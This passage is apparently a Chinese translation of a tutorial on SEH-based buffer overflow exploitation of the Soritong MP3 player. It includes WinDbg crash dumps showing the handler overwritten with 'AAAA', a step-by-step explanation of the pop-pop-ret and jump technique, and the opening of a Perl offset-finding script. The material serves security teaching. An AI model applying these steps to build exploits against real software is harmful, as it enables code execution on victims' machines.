FAULTING_IP:
SoriTong!TmC13_5+3ea3
00422e33 8810 mov byte ptr [eax],dl
EXCEPTION_RECORD: ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00422e33 (SoriTong!TmC13_5+0x00003ea3)
ExceptionCode: c0000005 (Access violation)
ExceptionFlags: 00000000
NumberParameters: 2
Parameter[0]: 00000001
Parameter[1]: 00130000
Attempt to write to address 00130000
FAULTING_THREAD: 00000a4c
PROCESS_NAME: SoriTong.exe
ADDITIONAL_DEBUG_TEXT:
Use '!findthebuild' command to search for the target build information.
If the build information is available, run '!findthebuild -s ; .reload' to set symbol path and load symbols.
FAULTING_MODULE: 7c900000 ntdll
DEBUG_FLR_IMAGE_TIMESTAMP: 37dee000
ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at "0x%08lx" referenced memory at
"0x%08lx". The memory could
not be "%s".
EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at "0x%08lx" referenced memory at
"0x%08lx". The memory
could not be "%s".
EXCEPTION_PARAMETER1: 00000001
EXCEPTION_PARAMETER2: 00130000
WRITE_ADDRESS: 00130000
FOLLOWUP_IP:
SoriTong!TmC13_5+3ea3
00422e33 8810 mov byte ptr [eax],dl
BUGCHECK_STR: APPLICATION_FAULT_INVALID_POINTER_WRITE_WRONG_SYMBOLS
PRIMARY_PROBLEM_CLASS: INVALID_POINTER_WRITE
DEFAULT_BUCKET_ID: INVALID_POINTER_WRITE
IP_MODULE_UNLOADED:
ud+41414140
41414141 ?? ???
LAST_CONTROL_TRANSFER: from 41414141 to 00422e33
STACK_TEXT:
WARNING: Stack unwind information not available. Following frames may be wrong.
0012fd38 41414141 41414141 41414141 41414141 SoriTong!TmC13_5+0x3ea3
0012fd3c 41414141 41414141 41414141 41414141 +0x41414140
0012fd40 41414141 41414141 41414141 41414141 +0x41414140
0012fd44 41414141 41414141 41414141 41414141 +0x41414140
0012fd48 41414141 41414141 41414141 41414141 +0x41414140
0012fd4c 41414141 41414141 41414141 41414141 +0x41414140
0012fd50 41414141 41414141 41414141 41414141 +0x41414140
0012fd54 41414141 41414141 41414141 41414141 +0x41414140
. . . (removed some of the lines)
0012ffb8 41414141 41414141 41414141 41414141 +0x41414140
0012ffbc
SYMBOL_STACK_INDEX: 0
SYMBOL_NAME: SoriTong!TmC13_5+3ea3
FOLLOWUP_NAME: MachineOwner
MODULE_NAME: SoriTong
IMAGE_NAME: SoriTong.exe
STACK_COMMAND: ~0s ; kb
BUCKET_ID: WRONG_SYMBOLS
FAILURE_BUCKET_ID: INVALID_POINTER_WRITE_c0000005_SoriTong.exe!TmC13_5
Followup: MachineOwner
EXCEPTION_RECORD指向ffffffff，说明程序没有一个异常处理例程用于处理这个溢出（将
使用操作系统提供的“最终”例程）
当在异常发生后，转储（dump）TEB，你将看到：
0:000> d fs:[0]
003b:00000000 64 fd 12 00 00 00 13 00-00 c0 12 00 00 00 00 00 d...............
003b:00000010 00 1e 00 00 00 00 00 00-00 f0 fd 7f 00 00 00 00 ................
003b:00000020 00 0f 00 00 30 0b 00 00-00 00 00 00 08 2a 14 00 ....0........*..
003b:00000030 00 b0 fd 7f 00 00 00 00-00 00 00 00 00 00 00 00 ................
003b:00000040 38 43 a4 e2 00 00 00 00-00 00 00 00 00 00 00 00 8C..............
003b:00000050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
003b:00000060 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
003b:00000070 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0x0012FD64.指向SEH链
这个区域现在包含了字母A
0:000> d 0012fd64
0012fd64 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fd74 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fd84 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fd94 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fda4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fdb4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fdc4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0012fdd4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
查看异常链：
0:000> !exchain
0012fd64: +41414140 (41414141)
Invalid exception stack at 41414141
=>所以我们已经成功覆盖异常处理例程。接下来让程序捕获这个异常（再次运行g命令），
看会发生什么：
EIP的值被覆盖为41414141了，因此我们可以控制EIP。
在运行!exchain命令看下：
0:000> !exchain
0012d658: ntdll!RtlConvertUlongToLargeInteger+7e (7c9032bc)
0012fd64: +41414140 (41414141)
Invalid exception stack at 41414141
Microsoft 发布了一个叫!exploitable的Windbg扩展。下载安装包，把DLL文件放到Windbg安
装目录下的winext子文件夹中。
这个模块可以帮助你确定一次程序的崩溃/异常/非法访问是否是可利用的。（所以它不限于
基于SEH的利用）
当这个模块用于Soritong MP3 player，在第一次异常发生时，我们看到：
(588.58c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00130000 ebx=00000003 ecx=00000041 edx=00000041 esi=0017f504
edi=0012fd64
eip=00422e33 esp=0012da14 ebp=0012fd38 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010212
*** WARNING: Unable to verify checksum for SoriTong.exe
*** ERROR: Symbol file could not be found. Defaulted to export symbols for
SoriTong.exe -
SoriTong!TmC13_5+0x3ea3:
00422e33 8810 mov byte ptr [eax],dl ds:0023:00130000=41
0:000> !load winext/msec.dll
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at
SoriTong!TmC13_5+0x0000000000003ea3
(Hash=0x46305909.0x7f354a3d)
User mode write access violations that are not near NULL are exploitable.
把异常传给程序处理（windbg捕获这个异常），我们看到：
0:000> g
(588.58c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=7c9032bc esi=00000000
edi=00000000
eip=41414141 esp=0012d644 ebp=0012d664 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246
+0x41414140:
41414141 ?? ???
0:000> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Read Access Violation
at the Instruction Pointer starting at
+0x0000000041414140 (Hash=0x4d435a4a.0x3e61660a)
Access violations at the instruction pointer are exploitable if not near NULL.
非常棒的模块，Microsoft干得好:-)
是否可以用寄存器跳到shellcode？
在windows xp sp1之前，为了执行shellcode你可以直接跳到寄存器。但sp1和更搞版本系统
，有了保护机制防止这样的事情发生。在异常处理例程得到控制权之前，寄存器都被清0.
以至于，在SEH发生作用时，寄存器将不可用。
相比于RET（控制EIP）型覆盖栈溢出，基于SEH Exploit所具有的优点
在一个典型的RET型溢出中，你覆盖EIP让它跳到你的shellcode。这个技术很好，但可能存在稳
定性问题（如果你不能在一个DLL模块中找到跳转指令或者你需要硬编码一个地址），它同样还
忍受着缓冲区大小带来的问题，以及放置shellcode的有效空间被限制。
当每一次你挖掘到基于栈的溢出和发现你可以覆盖EIP时，尝试进一步覆盖栈空间，试着到达SEH
链。进一步覆盖意味着你很有可能会得到更多有效的栈空间；一旦你覆盖EIP（用垃圾数据）的
同时会自动引发一个异常，如此就把一个“传统“的Exploit转变成了一个SEH Exploit了。
接着我们改如何利用基于SEH的漏洞？
简单。在基于SEH Exploit中，你的junk payload会依次覆盖next SEH域，接着是SE Handler
域，最后，放上你的shellcode。
当异常发生时，程序会跳到SE Handler去。所以你需要在SE Handler中放些什么让它跳到你
的shellcode。通过伪造一个二次异常来完成，这样程序就跳到next SEH pointer去。
因为next SEH域位于SE Handler域前面，会先被覆盖。而shellcode位于SE handler之后。如果
你是一个紧跟着一个，那么就可以欺骗SE handler去执行pop pop ret，它们会把next SEH的地
址放到EIP中，接下来在next SEH中指令将被执行（不是放地址到next SEH域中，而是放一
些指令进去）。在next SEH域中的指令要做的事就是跳过接下来的几个字节（存放SE Handler
的地方）然后你的shellcode将得到执行。
1st exception occurs :
|
--------------------------- (1)
|
-------+-------------- (3) opcode in next SEH : jump over SE Handler to the shellcode
| | |
| V V
[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]
opcode to do (3) Shellcode gets executed
jump over pop pop ret
SE Handler |
^ |
| |
-------------- (2) will „pretend‟ there‟s a second exception, puts address of next SEH
location in EIP, so opcode
gets executed
当然了，shellcode有可能不是紧跟在被覆盖的SE Handler后面...可能在前面还存在一些垃圾
字节...这对于确定shellcode的位置和正确的跳转到shellcode来说很关键。
在基于SEH的Exploit中你如何才能定位shellcode？
首先，找到next SEH和SE Handler的偏移，用指向pop pop ret指令串的指针覆盖SE Handler，
在next SEH中放置一个断点。当异常发生时程序被中断，这时你就可以观察shellcode了。具
体该如何做呢？看接下来的小节：
编写一个Exploit-找到“next SEH”和“SE Handler”的偏移
我们必须找到下面几个的偏移
1 “next SEH”的偏移，用jumpcode去覆盖它
2 “SE Handler”的偏移，用指向pop pop ret指令串的指针覆盖
3 放置shellcode的偏移
一个简单的办法就是用唯一模型字符串去填充payload（使用metasploit rulez ）去定位这3个
位置。
my $junk="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac".
"6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A".
"f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9".
"Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak".
"6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A".
"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9".
"Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As".
"6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2A".
"v3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9".
"Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba".
"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2B".